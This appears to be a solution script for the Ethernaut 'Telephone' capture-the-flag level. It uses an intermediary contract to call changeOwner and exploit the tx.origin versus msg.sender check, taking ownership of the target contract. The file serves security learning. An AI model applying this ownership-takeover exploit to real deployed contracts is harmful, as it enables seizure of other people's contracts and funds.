import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackTelephone = async () => {
    // change contract addresses here.
    const telephoneAddress = "0xF3AEFf7A6007cCB92593880594eBd587CD8379Dd"; //type "await contract.address()" in ethernaut console
    const player = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954"; //place your player address here (you may type player in ethernaut console)
    // wiretap address = "0x1460453ED98368367e3eBCDb0D8189CD8F32e33C";

    // Don't touch below 🚀
    // Vulnerability from being able to change woner of contract by using
    // another contract to satisfy its condition of not being the tx.origin
    // Additional read to understand more of tx.origin and msg.sender:
    // https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
    // https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            constant: undefined,
            inputs: [],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "constructor",
        },
        {
            constant: undefined,
            inputs: [{ internalType: "address", name: "_owner", type: "address" }],
            name: "changeOwner",
            outputs: [],
            payable: undefined,
            signature: "0xa6f9dae1",
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            constant: true,
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            payable: undefined,
            signature: "0x8da5cb5b",
            stateMutability: "view",
            type: "function",
        },
    ];

    const attack = await ethers.getContract("Wiretap");
    const contract = await ethers.getContractAt(ABI, telephoneAddress);
    console.log("Checking current Telephone owner...");
    const owner = await contract.owner();
    console.log(`Owner is: ${owner}`);
    console.log("Changing owner by using another contract...");
    const tx1 = await attack.changeOwner(telephoneAddress);
    const tx1Receipt = tx1.wait();
    console.log(tx1Receipt);
    console.log("Checking Telephone owner again...");
    const newOwner = await contract.owner();
    console.log(`Owner is: ${newOwner}`);
    if (player === newOwner) {
        console.log("Congrats! player is now the new owner...");
        console.log("You may now submit in ethernaut...");
    } else {
        console.log("player is still not the owner, review code above...");
    }
};

attackTelephone()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
